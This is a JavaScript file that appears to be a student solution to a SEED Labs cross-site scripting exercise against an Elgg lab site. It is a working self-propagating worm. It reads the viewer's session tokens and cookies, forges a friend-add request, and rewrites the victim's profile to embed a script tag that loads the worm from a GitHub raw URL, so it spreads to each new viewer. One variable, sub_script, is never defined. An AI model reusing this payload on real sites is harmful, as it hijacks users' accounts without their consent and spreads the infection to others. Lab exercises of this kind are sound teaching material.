var hackbiji_self_worm = document.getElementById("self-propagating-worm").innerHTML;
alert(hackbiji_self_worm);
var user = elgg.session.user.username;
if(user!='hackbiji'){
    var victim = null;
    victim = new XMLHttpRequest();
    victim.open("GET","http://www.xsslabelgg.com/action/friends/add?friend="+"43"+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token,true);
    victim.setRequestHeader("Host","www.xsslabelgg.com");
	victim.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0");
    victim.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    victim.setRequestHeader("Accept-Language","en-US,en;q=0.5");
    victim.setRequestHeader("Accept-Encoding","gzip, deflate");
    victim.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+user);
    victim.setRequestHeader("Cookie",document.cookie);
    victim.setRequestHeader("Connection","keep-alive");
    victim.send();    

    victim = null;
    victim = new XMLHttpRequest();
    victim.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
    victim.setRequestHeader("Host","www.xsslabelgg.com");
    victim.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0");
    victim.setRequestHeader("Accept-Language","en-US,en;q=0.5");
    victim.setRequestHeader("Accept-Encoding","gzip, deflate");
    victim.setRequestHeader("Cookie",document.cookie);
    victim.setRequestHeader("Connection","keep-alive");
    victim.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

    var content="__elgg_token=".concat(elgg.security.token.__elgg_token);
    content = content.concat("&__elgg_ts=").concat(elgg.security.token.__elgg_ts);
    content = content.concat("&name=").concat(user);
    content = content.concat("&&briefdescription=<script id='self-propagating-worm' type='text/javascript' src='https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/XSS/self-propagating-worm.js'></script>").concat(sub_script);
    content = content.concat("&guid=").concat(elgg.session.user.guid);

    victim.setRequestHeader("Content-Length",content.length);
    victim.send(content);
}
